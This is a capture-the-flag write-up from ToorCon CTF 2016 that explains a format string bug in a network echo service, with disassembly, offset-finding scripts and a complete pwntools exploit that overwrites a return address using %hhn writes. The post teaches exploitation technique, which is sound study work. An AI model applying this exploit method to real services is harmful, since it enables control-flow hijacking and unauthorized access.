---
layout: post
title: "for matt"
---

# for matt - toorcon ctf 2016

  We are told that there exists a vulnerability in the given executable and it's running at a given ip and port number. I had a feeling from the name of the challenge it was a format string bug.

  To use format string vulnerabilities one should note that the `printf` family of functions takes a variable number of arguments and cannot expect the number of arguments passed prior to being called. It uses the format string to evaluate how many arguments are passed and where on the stack they exist. Therefore if user controlled input is provided to it directly (without using a format specifier) then an attacker can read and write arbitrary memory locations.

  Echo is our vulnerable function with user input being passed directly to `sprintf`:

```
echo            proc near   

buf             = byte ptr -412h
s               = byte ptr -20Ch
var_C           = dword ptr -0Ch

                push    ebp
                mov     ebp, esp
                sub     esp, 428h
                mov     dword ptr [esp+8], 200h ; n
                mov     dword ptr [esp+4], 0 ; c
                lea     eax, [ebp+s]
                mov     [esp], eax      ; s
                call    _memset
                mov     dword ptr [esp+8], 206h ; n
                mov     dword ptr [esp+4], 0 ; c
                lea     eax, [ebp+buf]
                mov     [esp], eax      ; s
                call    _memset
                mov     eax, ds:comm_fd
                mov     dword ptr [esp+0Ch], 0 ; flags
                mov     dword ptr [esp+8], 200h ; n
                lea     edx, [ebp+s]
                mov     [esp+4], edx    ; buf
                mov     [esp], eax      ; fd
                call    _recv
                mov     [ebp+var_C], eax
                mov     eax, [ebp+var_C]
                mov     [esp+4], eax
                mov     dword ptr [esp], offset aRecvD ; "Recv: %d\n"
                call    _printf
                cmp     [ebp+var_C], 0
                jle     short loc_80488F1
                lea     eax, [ebp+buf]
                mov     dword ptr [eax], 56434552h
                mov     word ptr [eax+4], 3Ah
                lea     eax, [ebp+s]
                mov     [esp+4], eax    ; format
                lea     eax, [ebp+buf]
                add     eax, 5
                mov     [esp], eax      ; s
                call    _sprintf
                lea     eax, [ebp+buf]
                mov     [esp], eax      ; s
                call    _strlen
                mov     edx, ds:comm_fd
                mov     dword ptr [esp+0Ch], 0 ; flags
                mov     [esp+8], eax    ; n
                lea     eax, [ebp+buf]
                mov     [esp+4], eax    ; buf
                mov     [esp], edx      ; fd
                call    _send

loc_80488F1:               
                mov     eax, [ebp+var_C]
                leave
                retn
echo            endp
```

  The `%x` format specifier will print the value that printf finds on the stack in hex if you have a binary with a format string vulnerability, providing a number prior to the 'x' will pad the address with the given number of zeros.

```
➜  ~ nc localhost 6600
hello speedracers...
%08x.%08x
RECV:00000200.00000000
^C
➜  ~
```

  The `%n` format specifier can be used to write to memory. The specifier stores the number of bytes written to the file descriptor at the provided memory address. In this challenge we were provided with a secret function that does exactly what we want.
 
```
.text:080487B0 secretFunction  proc near
.text:080487B0                 push    ebp
.text:080487B1                 mov     ebp, esp
.text:080487B3                 sub     esp, 18h
.text:080487B6                 mov     dword ptr [esp], offset s ; "w00t. you made it to the secret functio"...
.text:080487BD                 call    _puts
.text:080487C2                 mov     eax, ds:data
.text:080487C7                 mov     [esp+4], eax
.text:080487CB                 mov     dword ptr [esp], offset format ; "this is the secret: %s\n"
.text:080487D2                 call    _printf
.text:080487D7                 mov     eax, ds:data
.text:080487DC                 mov     [esp], eax      ; s
.text:080487DF                 call    _strlen
.text:080487E4                 mov     ecx, ds:data
.text:080487EA                 mov     edx, ds:comm_fd
.text:080487F0                 mov     dword ptr [esp+0Ch], 0 ; flags
.text:080487F8                 mov     [esp+8], eax    ; n
.text:080487FC                 mov     [esp+4], ecx    ; buf
.text:08048800                 mov     [esp], edx      ; fd
.text:08048803                 call    _send
.text:08048808                 leave
.text:08048809                 retn
```

  I had to find the offset needed to leak the return address so that we could write in the address of the secretFunction. I calculated the return address from the saved ebp (since `%n` takes a pointer, we need the return address's address on the stack) which I was able to leak by calculating the distance from the end of our input buffer.

  Observe the size of our buffer in the disassembly for the echo function; buf is where are our input is.

```
.text:0804880A buf             = byte ptr -412h
.text:0804880A s               = byte ptr -20Ch
.text:0804880A var_C           = dword ptr -0Ch
```

  I leaked the address with what is called direct parameter access by some and the 'dollar sign trick' by others. The idea is you can use a format specifier like so: `%2$08x` to print the second argument to `printf` in hex, padded to a length of eight with zeroes. When finding the index to the saved ebp I used the size of our buffer divided by 4, since each stack entry holds 4 bytes. 

```
gef➤  p/d 0x412
$1 = 1042
gef➤  p/d 1042 / 4
$2 = 260 
gef➤
```

 Finding the index for the saved ebp was straightforward after getting past our huge buf variable, I made note of the address echo returns to; `0x80488b1d` and ran a program like the following.

```python
#!/usr/bin/python

from pwn import *

r = remote('localhost', 6600)
log.info(r.recv())

for i in range(260, 270):
        r.send("%{}$08x".format(str(i)))
        r.recvuntil("RECV:")
        log.info("i = {}: {}".format(str(i), r.recv()))

r.close()
```

```
➜  ~ python getebp.py
[+] Opening connection to localhost on port 6600: Done
[*] hello speedracers...
[*] i = 260: 00000000
[*] i = 261: 00000000
[*] i = 262: 00000011
[*] i = 263: f76d9000
[*] i = 264: ffc75d10
[*] i = 265: ffc75d68 <-- saved ebp
[*] i = 266: 08048b1d
[*] i = 267: 00000005
[*] i = 268: 08048d1b
[*] i = 269: 00000015
[*] Closed connection to localhost port 6600
```

 While running the program in gdb and making note of the saved ebp (`0xffffd658` in the following example) one can deduce the offset for the stack address address where the return address is saved. In the following example you see the top of the stack when eip is at `0x0804880b` (echo subroutine).

```
0xffffd5f8│+0x0000: 0xffffd658  →  0x0   ← $esp
0xffffd5fc│+0x0004: 0x08048b1d  →  <main+551>: mov DWORD PTR [esp+0x4c],eax
```

 Now I could calculate the offset to get the return address.

```
gef➤  p/x 0xffffd658 - 0xffffd5f8  <-- from main's stack frame to echo's
$2 = 0x60
gef➤  x/xw 0xffffd658 - 0x60 + 4   <-- return address :)
0xffffd5fc:     0x08048b1d
gef➤
```

 My plan was to conveniently place the pointer to the return address at the beginning of the input and pass the address to `printf` with direct parameter access. To find the necassary index I wrote some python like we did for ebp.

```python
#!/usr/bin/python

from pwn import *

r = remote('localhost', 6600)
log.info(r.recv())

for i in range(0, 150):
        r.send("AAAA%{}$08x".format(str(i)))
        r.recvuntil("RECV:")
        recieved =  r.recv()
        log.info("i = {}: {}".format(str(i), recieved))
        if '41414141' in recieved:
                success("i = {}: {}".format(str(i), recieved))
                break

r.close()
```

 The script above, when run; shows that the index to our input is 134

 To overwrite echo's return address we need only to write the 2 least significant bytes since echo's return address is `0x8048b1d` and the address of the secretFunction is `0x80487b0`. We can calculate the number of bytes we have to print in order to write the secretFunction address to the return address by simply converting the two desired bytes to decimal.

```
gef➤  p/d 0x87
$1 = 135
gef➤  p/d 0xb0
$2 = 176
gef➤
```

 Thus we calculated the format string in python

```
p32(raplus1) + p32(return_addr) + "A" * (135 - 8) + "%134$hhn" + "A" * (176 - 143 + 8) + "%135$hhn"
```

 Where the 143 + 8 is needed to offset the bytes written for one byte prior to writing the other byte.

```
➜  ~ python pwn66600.py
[+] Opening connection to eric.32774074faceba7c.ctf.land on port 6600: Done
[*] found RA @ ffd0534c
[*] Switching to interactive mode
RECV:MSLSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ SpacesInsteadOfTabs?!
```
## full exploit:

```python
#!/usr/bin/python

from pwn import *

# 134 is our input str
# 265 is our saved ebp

# RA is @ saved ebp - 0x60 + 0x4

# read out & save saved ebp
# calculate address of RA
# write this address at the beginning of the string and write with secret functions addr 

r = remote('eric.32774074faceba7c.ctf.land', 6600)
r.send("%265$08x")
r.recvuntil("RECV:")
saved_ebp = pack(u32(r.recv().decode('hex')), 32, "big")

return_addr = u32(saved_ebp) - 0x60 + 4
raplus1 = u32(saved_ebp) - 0x60 + 4 + 1

log.info("found RA @ {:x}".format(return_addr))

r.send(p32(raplus1) + p32(return_addr) + "A" * (135 - 8) + "%134$hhn" + "A" * (176 - 143 + 8) + "%135$hhn") # first one is 0x87, second one is 0xb0

r.interactive()

r.close()
```

